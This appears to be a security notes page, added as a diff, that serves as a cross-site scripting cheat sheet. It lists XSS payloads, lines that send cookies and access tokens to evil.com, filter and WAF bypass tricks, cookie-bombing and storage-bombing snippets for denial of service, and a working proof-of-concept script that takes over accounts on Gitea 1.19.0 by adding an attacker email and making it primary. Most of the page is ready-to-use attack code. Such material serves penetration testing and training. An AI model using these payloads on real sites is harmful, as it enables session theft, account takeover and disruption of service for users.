@@ -1,0 +1,190 @@
+---
+title: "XSS - Cross-site Scripting"
+description: "Overview of Cross-Site Scripting"
+lead: "Overview of Cross-Site Scripting"
+date: 2023-01-01T00:00:00+00:00
+lastmod: 2023-01-01T00:00:00+00:00
+draft: false
+images: []
+menu:
+  docs:
+    parent: "topics"
+weight: 620
+toc: true
+---
+
+## Basic payloads
+
+- [Cross-site scripting (XSS) cheat sheet - PortSwigger](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet): List of XSS payloads.
+
+```html
+<script>alert()</script>
+<img src=x onerror=alert()>
+<svg onload=alert()>
+
+<!-- Run debugger -->
+<img src=x onerror=debugger>
+
+<!-- Data exfiltration -->
+<script>
+document.location='//evil.com?c='.concat(document.cookie);
+document.location='//evil.com?t='.concat(localStorage.getItem('access_token'));
+</script>
+```
+
+## Filter/WAF Bypass
+
+Basic filter bypass:
+
+```html
+<!-- Alternate case -->
+<sCrIpt>alert()</ScRipt>
+<!-- No quotes -->
+alert(String.fromCharCode(88,83,83))
+alert(/XSS/.source)
+eval(atob(`YWxlcnQoKQ`))
+<!-- No parenthesis -->
+alert`1`
+<!-- Alternate calls -->
+["XSS"].map(alert)
+\u0061\u006C\u0065\u0072\u0074("XSS")
+```
+
+Call a function using `self["<func_name>"]()`:
+
+```html
+self[location.hash.substr(1,)]("XSS") <!-- Append #alert to our URL -->
+self[Object.keys(self)[5]]("XSS")
+
+> Object.keys(self)
+>>> Array(316) [ "close", "stop", "focus", "blur", "open", "alert", "confirm", "prompt", "print", "postMessage", … ]
+```
+
+## DOS
+
+### Cookie bombing
+
+Servers often block users that send requests with very large headers (e.g. 8K or 16K bytes).
+
+- [431 - Request Header Fields Too Large](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431): when the total size of request headers is too large, or when a single header field is too large. Not to be confused with [414 - URI too long](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/414).
+
+```js
+const value = "a".repeat(4080);
+document.cookie = "";
+
+for (let i = 0; i < 100; i++) {
+    let name = "a" + i;
+    document.cookie = `${name}=${value}; path=/; domain=.example.com`;
+}
+```
+
+{{< details "Nginx - large_client_header_buffers" >}}
+> Syntax: 	large_client_header_buffers number size;<br>
+> Default: 	large_client_header_buffers 4 8k;
+
+- [large\_client\_header\_buffers](http://nginx.org/en/docs/http/ngx_http_core_module.html#large_client_header_buffers): Sets the maximum number and size of buffers used for reading large client request header. **By default, the buffer size is equal to 8K bytes**.
+- A request header field cannot exceed the size of one buffer as well, or the 400 (Bad Request) error is returned to the client.
+{{< /details >}}
+
+{{< details "Apache - LimitRequestFieldSize" >}}
+> Syntax: LimitRequestFieldSize bytes<br>
+> Default: LimitRequestFieldSize 8190
+
+- [LimitRequestFieldSize](https://httpd.apache.org/docs/current/mod/core.html#limitrequestfieldsize): specifies the number of bytes that will be allowed in an HTTP request header.
+{{< /details >}}
+
+{{< details "NodeJS - http.maxHeaderSize" >}}
+- [http.maxHeaderSize](https://nodejs.org/api/http.html#httpmaxheadersize): Read-only property specifying the maximum allowed size of HTTP headers in bytes. **Defaults to 16384 (16 KiB)**.
+- Configurable using the CLI option `--max-http-header-size=size` or inside [`http.request(url[, options][, callback])`](https://nodejs.org/api/http.html#httprequesturl-options-callback)
+{{< /details >}}
+
+### Local/Session Storage bombing
+
+Local/Session storage have a size limit which depends on the web browser.
+
+- `localStorage` and `sessionStorage` both use the [Storage interface](https://html.spec.whatwg.org/#the-storage-interface).
+- The Storage interface throws a [QuotaExceededError](https://webidl.spec.whatwg.org/#dom-domexception-quota_exceeded_err) ([DOMException](https://webidl.spec.whatwg.org/#idl-DOMException)) if the quota has been exceeded.
+```js
+const value = "a".repeat(4080);
+localStorage.clear();
+sessionStorage.clear();
+
+for (let i = 0; i < 100; i++) {
+    let name = "a" + i;
+    localStorage.setItem(name, value);
+    sessionStorage.setItem(name, value);
+}
+```
+
+- [Test of localStorage limits/quota](https://arty.name/localstorage.html): Test the limit of your browser.
+
+{{< details "Limit - Numbers of characters" >}}
+- Chrome 6.0.472.36 beta: 2600-2700k
+- Firefox 3.6.8: 5200-5300k
+- Explorer 8: 4900-5000k
+- Opera 10.70 build 9013 popped a dialog, that allowed me to give the script unlimited storage.
+{{< /details >}}
+
+## Account Takeover
+
+### Gitea - Change primary email
+
+{{< details "Proof of Concept" >}}
+Tested on **Gitea Version: 1.19.0**
+
+Before running the PoC:
+![Before Gitea ATO](https://i.imgur.com/eYL86BI.png)
+
+After running the PoC:
+![After Gitea ATO](https://i.imgur.com/022HvKl.png)
+
+Proof of Concept code:
+```js
+const attacker_email = "evil@yopmail.com";
+
+// 1) Obtain CSRF token
+fetch("/user/settings/account").then(res => res.text()).then(data => {
+    let csrfToken = data.match(/csrfToken: '([a-zA-Z0-9_-]+)',/).at(-1);
+    // 2) Add secondary email address
+    fetch("/user/settings/account/email", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/x-www-form-urlencoded"
+        },
+        body: `_csrf=${csrfToken}&email=${attacker_email}`
+    })
+    .then(res => res.text()).then(data => {
+        // 3) Obtain CSRF token & email ID
+        fetch("/user/settings/account").then(res => res.text()).then(data => {
+            let csrfToken = data.match(/csrfToken: '([a-zA-Z0-9_-]+)',/).at(-1);
+            let email_id = "";
+
+            const htmlDoc = new DOMParser().parseFromString(data, "text/html");
+            const emailStrong = htmlDoc.getElementsByClassName("ui email list")[0].getElementsByTagName("strong");
+            for (let i = 0; i < emailStrong.length; i++) {
+              if (emailStrong[i].innerText == attacker_email) {
+                email_id = emailStrong[i].parentNode.parentNode.getElementsByClassName("button delete-button")[0].getAttribute("data-id");
+                break;
+              }
+            }
+            // 4) Set the email to primary address
+            fetch("/user/settings/account/email", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/x-www-form-urlencoded"
+                },
+                body: `_csrf=${csrfToken}&_method=PRIMARY&id=${email_id}`
+            });
+        });
+    })
+})
+```
+{{< /details >}}
+
+## XSS to RCE
+
+Todo:
+- Wordpress
+- Drupal
+
+
